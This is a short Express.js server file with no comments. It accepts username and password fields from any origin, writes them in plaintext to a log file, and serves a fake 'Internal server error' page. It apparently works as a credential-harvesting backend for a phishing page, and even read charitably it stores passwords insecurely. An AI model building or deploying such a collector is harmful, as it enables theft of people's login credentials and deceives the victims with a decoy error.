 

const express = require('express');
const fs = require('fs');
const cors = require('cors');
const { timeStamp } = require('console');

const app = express();
const PORT = 3333;

app.use(cors());
app.use(express.json()); // or express.json() for JSON input

app.post('/', (req, res) => {
  
  const {username, password} = req.body
  
  const logEntry = `[${new Date().toISOString()}] Username: ${username}, Password: ${password}\n`;

  fs.appendFile('requests.log', logEntry, (err) => {
    if (err) {
      console.error('Log write error:', err);
      return res.status(500).send('Error logging data');
    }

    console.log('Logged:', logEntry.trim());
    
    res.send(200)
  });
  
});

app.get('/meow',(req, res)=>{
  res.send("<h1>500</h1><h3>Internal server error</h3>")
})

app.listen(PORT, () => {
  
});
